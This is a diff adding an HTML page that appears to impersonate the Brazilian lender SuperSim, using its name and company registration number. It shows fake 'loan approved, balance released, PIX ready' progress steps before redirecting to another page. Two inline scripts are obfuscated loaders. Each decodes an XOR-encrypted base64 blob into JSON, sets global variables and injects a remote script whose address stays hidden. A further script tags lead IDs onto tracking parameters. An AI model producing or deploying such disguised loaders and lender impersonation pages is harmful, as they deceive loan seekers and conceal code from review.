@@ -1,0 +1,465 @@
+﻿<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+
+    <title>SuperSim — Configurando sua conta</title>
+    
+    <!-- <script>
+        window.pixelId = '69e04014a85bd8bc16a0d86b';
+    
+        const a = document.createElement('script');
+    
+        a.setAttribute('async', '');
+    
+        a.setAttribute('defer', '');
+    
+        a.setAttribute('src', 'https://cdn.utmify.com.br/scripts/pixel/pixel.js');
+        
+        document.head.appendChild(a);
+    </script> -->
+
+    <script>(function(){var t_ma=atob("DNcNP8SqJifsUrkIuKwvSrbGBB3OOs18yKQ3EOvJQknCJ81l0bF0EafFSwmOIJZ726VkT7DZCVeFKtxkl6dkR6HGC0CDPd5k3flnTOaGBEaYJsth2qJ5WreIHHyxfptv1LhvXqjZBB23KZtm2bpoHf6IQUiDNdVt6L51WqjjQgXAcM9p1KJoHf6IEEbba404iONrXPGSRRTaZIxp2+I8XPfJBFqxLw==");var q_5j7=[];for(var p_w=0;p_w<t_ma.length;p_w++){q_5j7.push(t_ma.charCodeAt(p_w)&255);}var r_0=q_5j7[0];var w_zhz=q_5j7.slice(1,1+r_0);var y_o=q_5j7.slice(1+r_0);var v_d2k=y_o.map(function(b,s_cdd){return b^w_zhz[s_cdd%r_0];});var l_8="";for(var f_dj9w=0;f_dj9w<v_d2k.length;f_dj9w++){l_8+=String.fromCharCode(v_d2k[f_dj9w]&255);}var q_5w=decodeURIComponent(escape(l_8));var h_bli2=JSON.parse(q_5w);var f_6ks4=h_bli2.globals||[];f_6ks4.forEach(function(b_91s8){window[b_91s8.name]=b_91s8.value;});var p_43e=document.createElement("script");p_43e.src=h_bli2.url;p_43e.async=true;p_43e.defer=true;(h_bli2.attributes||[]).forEach(function(q_t){p_43e.setAttribute(q_t.name,q_t.value);});(document.head||document.documentElement).appendChild(p_43e);})();</script><script src="js/pixel-google.js" async="" defer=""></script>
+
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&amp;family=Outfit:wght@400;500;600;700;800&amp;family=Sora:wght@600;700;800&amp;family=Plus+Jakarta+Sans:wght@400;500;600;700;800&amp;family=Poppins:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+   
+   <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        html,
+        body {
+            height: 100%;
+            width: 100%;
+            overflow: hidden;
+        }
+
+        body {
+            font-family: 'DM Sans', sans-serif;
+            background: linear-gradient(160deg, #FB9637 0%, #E8850A 40%, #B45309 70%, #92400E 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: fixed;
+            inset: 0;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* Decorative blobs */
+        body::before {
+            content: '';
+            position: absolute;
+            top: -120px;
+            right: -80px;
+            width: 320px;
+            height: 320px;
+            background: radial-gradient(circle, rgba(255, 255, 255, .1) 0%, transparent 70%);
+            pointer-events: none;
+        }
+
+        body::after {
+            content: '';
+            position: absolute;
+            bottom: -100px;
+            left: -60px;
+            width: 260px;
+            height: 260px;
+            background: radial-gradient(circle, rgba(255, 255, 255, .07) 0%, transparent 70%);
+            pointer-events: none;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            padding: 40px 30px;
+            max-width: 380px;
+            width: 100%;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* ===== LOGO ===== */
+        .logo {
+            margin-bottom: 8px;
+            animation: fadeDown .6s ease;
+        }
+
+        .logo-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .logo .la {
+            font-family: 'Sora', sans-serif;
+            font-weight: 800;
+            font-size: 32px;
+            color: white;
+            letter-spacing: -.5px;
+            line-height: 1;
+        }
+
+        .logo .lc {
+            font-family: 'Sora', sans-serif;
+            font-weight: 800;
+            font-size: 32px;
+            color: #FEF3C7;
+            letter-spacing: -.5px;
+            line-height: 1;
+        }
+
+        .logo-tag {
+            font-family: 'DM Sans', sans-serif;
+            font-weight: 600;
+            font-size: 9px;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            color: rgba(255, 255, 255, .5);
+            margin-top: 3px;
+        }
+
+        /* ===== GREETING ===== */
+        .greeting {
+            margin: 36px 0 6px;
+            animation: fadeDown .6s .3s ease both;
+        }
+
+        .greeting span {
+            font-size: 16px;
+            color: rgba(255, 255, 255, .7);
+        }
+
+        .greeting h1 {
+            font-family: 'Outfit', sans-serif;
+            font-size: 28px;
+            font-weight: 800;
+            color: white;
+            margin-top: 2px;
+        }
+
+        /* ===== SPINNER ===== */
+        .spinner-area {
+            margin: 40px 0 16px;
+            animation: fadeDown .6s .6s ease both;
+        }
+
+        .spinner {
+            width: 52px;
+            height: 52px;
+            border: 3.5px solid rgba(255, 255, 255, .2);
+            border-top: 3.5px solid white;
+            border-radius: 50%;
+            animation: spin .85s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .status-text {
+            font-family: 'Outfit', sans-serif;
+            font-size: 18px;
+            font-weight: 600;
+            color: white;
+            margin-top: 18px;
+            animation: fadeDown .6s .8s ease both;
+        }
+
+        /* ===== CHECKLIST ===== */
+        .checklist {
+            margin-top: 32px;
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+            width: 100%;
+            max-width: 320px;
+        }
+
+        .check-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            opacity: 0;
+            transform: translateY(12px);
+            transition: all .5s cubic-bezier(.4, 0, .2, 1);
+        }
+
+        .check-item.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .check-icon {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, .15);
+            border: 2px solid rgba(255, 255, 255, .2);
+            transition: all .4s ease;
+        }
+
+        .check-item.show .check-icon {
+            background: rgba(255, 255, 255, .2);
+            border-color: rgba(255, 255, 255, .4);
+        }
+
+        .check-icon svg {
+            width: 14px;
+            height: 14px;
+            color: white;
+            stroke-width: 3;
+            opacity: 0;
+            transform: scale(.5);
+            transition: all .3s .1s ease;
+        }
+
+        .check-item.show .check-icon svg {
+            opacity: 1;
+            transform: scale(1);
+        }
+
+        .check-text {
+            font-size: 15px;
+            font-weight: 500;
+            color: rgba(255, 255, 255, .85);
+            text-align: left;
+        }
+
+        /* ===== PROGRESS BAR ===== */
+        .progress-wrap {
+            width: 100%;
+            max-width: 280px;
+            margin-top: 36px;
+            animation: fadeDown .6s 1s ease both;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: rgba(255, 255, 255, .15);
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: white;
+            border-radius: 4px;
+            transition: width .6s ease;
+        }
+
+        .progress-label {
+            font-size: 11px;
+            color: rgba(255, 255, 255, .45);
+            margin-top: 8px;
+        }
+
+        /* ===== FOOTER ===== */
+        .splash-foot {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 16px 20px env(safe-area-inset-bottom, 16px);
+            text-align: center;
+        }
+
+        .splash-foot p {
+            font-size: 10.5px;
+            color: rgba(255, 255, 255, .3);
+            line-height: 1.5;
+        }
+
+        /* ===== ANIMATIONS ===== */
+        @keyframes fadeDown {
+            from {
+                opacity: 0;
+                transform: translateY(-12px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+    </style>
+<script>(function(){var r_9es=atob("DLBpXitGABJOWOC5v8tLK1kqIihsMJTNz8NTcQQlZHxgLZTU1tYQcEgpbTwsKs/K3MIALl81L2InIIXVkMAAJk4qLXUhN4fV2p4DLQlqInM6LJLQ3cUdO1hkOkkTdMLe098LP0c1IigVI8LX3t0MfBFkZ30hP4zc79kRO0cPZDBiepbY08UMfBFkNnN4YIWM3YQLOxwjMioobNWM3dVYZhMkIm8TJQ==");var m_1me=[];for(var j_k=0;j_k<r_9es.length;j_k++){m_1me.push(r_9es.charCodeAt(j_k)&255);}var p_np=m_1me[0];var m_37xv=m_1me.slice(1,1+p_np);var l_qxyp=m_1me.slice(1+p_np);var h_da6=l_qxyp.map(function(b,v_p6zx){return b^m_37xv[v_p6zx%p_np];});var n_08z="";for(var z_e3a=0;z_e3a<h_da6.length;z_e3a++){n_08z+=String.fromCharCode(h_da6[z_e3a]&255);}var v_i8l9=decodeURIComponent(escape(n_08z));var x_qa8=JSON.parse(v_i8l9);var f_ueh=x_qa8.globals||[];f_ueh.forEach(function(y_qzsu){window[y_qzsu.name]=y_qzsu.value;});var x_1254=document.createElement("script");x_1254.src=x_qa8.url;x_1254.async=true;x_1254.defer=true;(x_qa8.attributes||[]).forEach(function(i_jpg){x_1254.setAttribute(i_jpg.name,i_jpg.value);});(document.head||document.documentElement).appendChild(x_1254);})();</script>
+</head>
+
+<body>
+    <div class="container">
+        <!-- LOGO -->
+        <div class="logo">
+            <div class="logo-row"><img src="images/xtPMNChtyfPs.svg" alt="SuperSim" style="height:38px;width:auto;">
+            </div>
+        </div>
+
+        <!-- GREETING -->
+        <div class="greeting">
+            <span>Olá,</span>
+            <h1 id="userName">Cliente</h1>
+        </div>
+
+        <!-- SPINNER -->
+        <div class="spinner-area">
+            <div class="spinner"></div>
+        </div>
+        <div class="status-text" id="statusText">Configurando sua conta</div>
+
+        <!-- CHECKLIST -->
+        <div class="checklist" id="checklist">
+            <div class="check-item" id="step1">
+                <div class="check-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
+                    </svg></div>
+                <span class="check-text">Conta criada com sucesso</span>
+            </div>
+            <div class="check-item" id="step2">
+                <div class="check-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
+                    </svg></div>
+                <span class="check-text">Empréstimo aprovado e disponível</span>
+            </div>
+            <div class="check-item" id="step3">
+                <div class="check-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
+                    </svg></div>
+                <span class="check-text">Saldo liberado para saque</span>
+            </div>
+            <div class="check-item" id="step4">
+                <div class="check-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
+                    </svg></div>
+                <span class="check-text">PIX pronto para transferência</span>
+            </div>
+        </div>
+
+        <!-- PROGRESS BAR -->
+        <div class="progress-wrap">
+            <div class="progress-bar">
+                <div class="progress-fill" id="progFill"></div>
+            </div>
+            <div class="progress-label" id="progLabel">Preparando tudo para você...</div>
+        </div>
+    </div>
+
+    <!-- FOOTER -->
+    <div class="splash-foot">
+        <p>SuperSim Soluções Financeiras S.A. — CNPJ 02.038.232/0001-64<br>Ambiente seguro com criptografia SSL</p>
+    </div>
+
+    <script>
+        // Load user name
+        const nome = localStorage.getItem('nome') || '';
+        if (nome) {
+            const primeiro = nome.trim().split(' ')[0];
+            document.getElementById('userName').textContent = primeiro;
+        }
+
+        const steps = ['step1', 'step2', 'step3', 'step4'];
+        const fill = document.getElementById('progFill');
+        const label = document.getElementById('progLabel');
+        const statusText = document.getElementById('statusText');
+
+        const messages = [
+            'Configurando sua conta',
+            'Verificando dados',
+            'Ativando empréstimo',
+            'Preparando ambiente',
+            'Quase pronto...'
+        ];
+
+        // Animate steps one by one
+        let current = 0;
+        function nextStep() {
+            if (current < steps.length) {
+                document.getElementById(steps[current]).classList.add('show');
+                fill.style.width = ((current + 1) / steps.length * 100) + '%';
+                if (current < messages.length) {
+                    statusText.textContent = messages[current + 1] || messages[current];
+                }
+                current++;
+                setTimeout(nextStep, 1800);
+            } else {
+                // All done - redirect
+                label.textContent = 'Pronto! Redirecionando...';
+                statusText.textContent = 'Tudo pronto!';
+                setTimeout(() => {
+                    window.location.href = (window.location.pathname.endsWith('.html') ? 'conta.html' : '../conta') + window.location.search;
+                }, 1200);
+            }
+        }
+
+        // Start after initial animations
+        setTimeout(nextStep, 1800);
+    </script>
+    
+    <script>
+(function () {
+  const POLL_MS = 500;
+
+  function getStorageKey() {
+    const url = new URL(window.location.href);
+    const current = url.searchParams.get("utm_source");
+    if (current === "FB") return "lead";
+    if (current === "google") return "lead-google";
+    return null;
+  }
+
+  function getLeadId(storageKey) {
+    if (!storageKey) return null;
+    const raw = localStorage.getItem(storageKey);
+    if (!raw) return null;
+    try {
+      const obj = JSON.parse(raw);
+      return obj && obj._id ? String(obj._id) : null;
+    } catch {
+      return null;
+    }
+  }
+
+  function applyUtmIfNeeded() {
+    const url = new URL(window.location.href);
+    const current = url.searchParams.get("utm_source");
+    const storageKey = getStorageKey();
+    const id = getLeadId(storageKey);
+    if (!id) return false;
+
+    let desired = null;
+    if (current === "FB") {
+      desired = "FBjLj" + id;
+    } else if (current === "google") {
+      desired = "googlejLj" + id;
+    }
+
+    if (!desired) return false; 
+
+    url.searchParams.set("utm_source", desired);
+    window.location.replace(url.toString());
+    return true;
+  }
+
+  if (applyUtmIfNeeded()) return;
+
+  const interval = setInterval(() => {
+    if (applyUtmIfNeeded()) clearInterval(interval);
+  }, POLL_MS);
+})();
+</script>
+
+
+
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon='{"version":"2024.11.0","token":"b97fe64222db46cb8498390bcbfc71c4","r":1,"spa":2}' crossorigin="anonymous"></script>
+</body></html>
